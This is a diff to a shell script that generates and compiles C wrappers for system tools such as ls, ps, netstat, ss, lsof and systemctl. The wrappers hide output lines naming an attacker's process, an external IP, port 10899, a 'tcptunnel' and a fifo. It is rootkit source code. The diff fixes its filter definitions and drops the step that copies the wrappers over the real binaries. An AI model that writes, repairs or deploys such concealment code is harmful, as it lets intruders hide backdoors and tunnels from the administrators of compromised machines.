@@ -6,15 +6,15 @@ do
 
 	a="`which $i`"wvikdlas
 	j="${a/$i/wvikdlas$i}"
-	key1="systemd-apt-power"
-	key2='43.228.91.117'
-	key3='-unix'
-	key4='ssh'
-	key5='wvikdlas'
-	key6='out_fifo'
-	key7='10899'
-	key8='tcptunnel'
-	key9='10.84.2.16'
+        key1="systemd-apt-power"
+        key2='43.228.91.117'
+        key3='-unix'
+        key4='ssh'
+        key5='wvikdlas'
+        key6='out_fifo'
+        key7='10899'
+        key8='tcptunnel'
+        key9='10.84.2.16'
 	cat << EOF > $i.c
     #define BUFFER_LEN 0x400
     #define BIN "$j"
@@ -24,9 +24,9 @@ do
     #define INFO4 "$key4"
     #define INFO5 "$key5"
     #define INFO6 "$key6"
-    #define INFO7 "$key6"
-    #define INFO8 "$key6"
-    #define INFO9 "$key6"
+    #define INFO7 "$key7"
+    #define INFO8 "$key8"
+    #define INFO9 "$key9"
     #include <stdlib.h>
     #include <stdio.h>
     #include <unistd.h>
@@ -103,7 +103,7 @@ do
 	                    if (info_inline(INFO6, out_buf)) break;
 	                    if (info_inline(INFO7, out_buf)) break;
 	                    if (info_inline(INFO8, out_buf)) break;
-	                    if (info_inline(INFO9, out_buf)) break;
+			    if (info_inline(INFO9, out_buf)) break;
 	                    //add info here
 
 	                    if (info_inline("/ss", argv[0]) || info_inline("/systemctl", argv[0]))
@@ -126,37 +126,26 @@ do
 	}
 EOF
 	gcc -std=c99 $i.c -o ./$i
-	z="`which cp`"
-	b="`which $i`"
-	$z $b $j
-	$z './'$i $b
-	#echo ''
 done
 
 
 
 for i in 'ls' 'ps' 'ss' 'netstat' 'lsof' 'strings' 'systemctl' 'last' 'grep' 'find' 'service'
-#for i in 'ls' 'ps' 'ss' 'netstat' 'lsof' 'strings' 'grep' 'last'
-#for i in 'grep' 'systemctl'
-#'ls' 'ps' 'ss' 'netstat' 'lsof' 'strings' 
-#for i in 'find'
-#for i in 'ls' 
-#for i in 'systemctl' 
 do
 	unalias $i
 	rm -f ./*.c
 	rm -f ./$i
 	a="`which $i`"wvikdlas
 	j="${a/$i/wvikdlas$i}"
-	key1="systemd-apt-power"
-	key2='43.228.91.117'
-	key3='-unix'
-	key4='ssh'
-	key5='wvikdlas'
-	key6='out_fifo'
-	key7='10899'
-	key8='tcptunnel'
-	key9='10.84.2.16'
+        key1="systemd-apt-power"
+        key2='43.228.91.117'
+        key3='-unix'
+        key4='ssh'
+        key5='wvikdlas'
+        key6='out_fifo'
+        key7='10899'
+        key8='tcptunnel'
+        key9='10.84.2.16'
 	/bin/wvikdlascatwvikdlas << EOF > $i.c
     #define BUFFER_LEN 0x400
     #define BIN "$j"
@@ -166,9 +155,9 @@ do
     #define INFO4 "$key4"
     #define INFO5 "$key5"
     #define INFO6 "$key6"
-    #define INFO7 "$key6"
-    #define INFO8 "$key6"
-    #define INFO9 "$key6"
+    #define INFO7 "$key7"
+    #define INFO8 "$key8"
+    #define INFO9 "$key9"
     #include <stdlib.h>
     #include <stdio.h>
     #include <unistd.h>
@@ -257,7 +246,7 @@ do
 	                    if (info_inline(INFO6, out_buf)) break;
 	                    if (info_inline(INFO7, out_buf)) break;
 	                    if (info_inline(INFO8, out_buf)) break;
-	                    if (info_inline(INFO9, out_buf)) break;
+			    if (info_inline(INFO9, out_buf)) break;
 	                    //add info here
 
 	                    if (info_inline("ss", argv[0]) || info_inline("systemctl", argv[0]))
@@ -285,11 +274,6 @@ do
 	}
 EOF
 	gcc -std=c99 $i.c -o ./$i
-	z="`which cp`"
-	b="`which $i`"
-	$z $b $j
-	$z './'$i $b
-	#echo ''
 done
 
 
